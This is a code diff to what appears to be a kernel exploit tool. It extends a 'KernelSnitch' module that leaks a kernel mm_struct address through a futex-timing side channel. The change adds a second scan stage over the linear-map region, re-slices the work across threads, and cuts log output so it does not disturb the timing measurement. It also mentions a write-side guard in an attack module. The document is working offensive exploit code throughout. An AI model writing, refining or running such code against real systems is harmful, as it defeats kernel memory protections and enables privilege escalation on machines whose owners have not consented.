@@ -43,7 +43,7 @@ namespace ghostlock::kernel {
 #if VA_BITS==39
 #define IDENTITY_START (::ghostlock::kernel::KERNELSNITCH_IDENTITY_START)
 #define IDENTITY_END   (::ghostlock::kernel::KERNELSNITCH_IDENTITY_END)
-// #define IDENTITY_END   0xffffffc000000000ULL
+#define LINEAR_END     (::ghostlock::kernel::KERNELSNITCH_LINEAR_END)
 #elif VA_BITS==48
 #define IDENTITY_START 0xffff000000000000ULL
 #define IDENTITY_END   0xffff800000000000ULL
@@ -51,6 +51,21 @@ namespace ghostlock::kernel {
 #error "Unsupported VA_BITS (expected 39 or 48)"
 #endif
 #define COARSE_SZ (1ULL << 30)
+#endif
+
+/* Targets without a wider linear region keep a single stage: LINEAR_END equal
+ * to IDENTITY_END makes the stage-2 guard below a no-op. */
+#ifndef LINEAR_END
+#define LINEAR_END IDENTITY_END
+#endif
+
+/* Verbose KernelSnitch tracing. Off by default; build with
+ * -DGHOSTLOCK_KERNELSNITCH_VERBOSE=1 to get the per-thread slice bounds, the
+ * resolved futex table size and every screened collision with its timings.
+ * The slice bounds are the only runtime confirmation that a scan-window change
+ * took effect, so a build that changes the window should enable this. */
+#ifndef GHOSTLOCK_KERNELSNITCH_VERBOSE
+#define GHOSTLOCK_KERNELSNITCH_VERBOSE 0
 #endif
 
 namespace ghostlock::kernelsnitch {
@@ -284,22 +299,33 @@ namespace ghostlock::kernelsnitch {
         return 0;
     }
 
-    static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical, int32_t sweep_tags) {
+    /* Scan [lo, hi) with the thread pool. The slices are derived here instead of
+ * from ks->identity_diff so a later pass can cover a disjoint range without
+ * rescanning an earlier one. */
+    static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical,
+                                   int32_t sweep_tags, size_t lo, size_t hi) {
         /* the leak check discards a match past the measured end, so no slice
      * scans past it */
         const size_t ceiling = std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
-                                                  static_cast<uint64_t>(IDENTITY_END));
+                                                  static_cast<uint64_t>(hi));
+        if (ceiling <= lo || ks->thread_cnt == 0)
+            return;
+        const size_t diff = (ceiling - lo) / ks->thread_cnt;
         for (size_t i = 0; i < ks->thread_cnt; ++i) {
             struct mm_leak_arg *mm_leak_arg = static_cast<struct mm_leak_arg *>(SYSCHK(
                 calloc(1, sizeof(struct mm_leak_arg))));
             mm_leak_arg->ks = ks; // NOLINT(clang-analyzer-nullability.NullableDereferenced)
             mm_leak_arg->range.id = i;
-            mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff * i;
-            mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff * (i + 1);
+            mm_leak_arg->range.start = lo + diff * i;
+            /* integer division leaves a remainder; the last slice takes it */
+            mm_leak_arg->range.end = (i + 1 == ks->thread_cnt) ? ceiling : lo + diff * (i + 1);
             mm_leak_arg->try_canonical = try_canonical;
             mm_leak_arg->sweep_tags = sweep_tags;
             if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
                 mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
+            /* down-aligning slice 0 must not reach back into an earlier pass */
+            if (mm_leak_arg->range.start < lo)
+                mm_leak_arg->range.start = lo;
             if ((mm_leak_arg->range.end % COARSE_SZ) != 0)
                 mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
             if (mm_leak_arg->range.end > ceiling)
@@ -526,7 +552,9 @@ namespace ghostlock::kernelsnitch {
                             wanted > KERNELSNITCH_COLLISION_POOL);
         int32_t full_probed = (full_probe_after >= ks->total_futexes || wanted > KERNELSNITCH_COLLISION_POOL);
         for (size_t i = 2; i < ks->total_futexes; ++i) {
-            if (ks->verbose && (i % 256) == 0)
+            /* one line per 8192 probes: at 256 this dominates the log and the
+         * extra I/O perturbs the timing side channel it is reporting on */
+            if (ks->verbose && (i % 8192) == 0)
                 pr_info("  collision scan %zu/%zu\n", i, ks->total_futexes);
             size_t id = (i * 4096) | (i * 8 % 4096);
             if (id >= FUTEX_SZ)
@@ -634,9 +662,35 @@ namespace ghostlock::kernelsnitch {
         if (ks->verbose) pr_info("start bruteforcing\n");
         ghostlock::kernel::reset_cpu_pin();
 
-        __run_mm_leak_pass(ks, 1, 0);
+        /* Stage 1 is the historical window. Stage 2 only runs when stage 1 found
+     * nothing and only covers [stage1_end, linear_end), so a target inside the
+     * historical window costs exactly what it used to: the slices stay small.
+     * Widening the window unconditionally would grow every slice and therefore
+     * the mean distance from a slice start to the target (window / 2 / threads).
+     *
+     * g_direct_map_end clamps stage 2 only when apply_iomem_cache actually
+     * measured it; its built-in default is a guess below LINEAR_END and would
+     * otherwise cap stage 2 for no reason. The write-side guard in
+     * attack/ops.hpp keeps using the unmodified DIRECT_MAP_END. */
+        const size_t stage1 = std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
+                                                 static_cast<uint64_t>(IDENTITY_END));
+        const int32_t measured =
+                ghostlock::kernel::g_direct_map_end != ghostlock::kernel::DIRECT_MAP_END;
+        const size_t stage2 = measured
+                                  ? std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
+                                                       static_cast<uint64_t>(LINEAR_END))
+                                  : static_cast<size_t>(LINEAR_END);
+
+        __run_mm_leak_pass(ks, 1, 0, IDENTITY_START, stage1);
         if (!ks->found)
-            __run_mm_leak_pass(ks, 0, 1);
+            __run_mm_leak_pass(ks, 0, 1, IDENTITY_START, stage1);
+        if (!ks->found && stage2 > stage1) {
+            if (ks->verbose)
+                pr_info("stage 2: extending scan to %016zx\n", stage2);
+            __run_mm_leak_pass(ks, 1, 0, stage1, stage2);
+            if (!ks->found)
+                __run_mm_leak_pass(ks, 0, 1, stage1, stage2);
+        }
         ks->state = (ks->mm_struct == static_cast<size_t>(-1)) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
         return ks->state == KERNELSNITCH_MM_FOUND ? 0 : -1;
     }
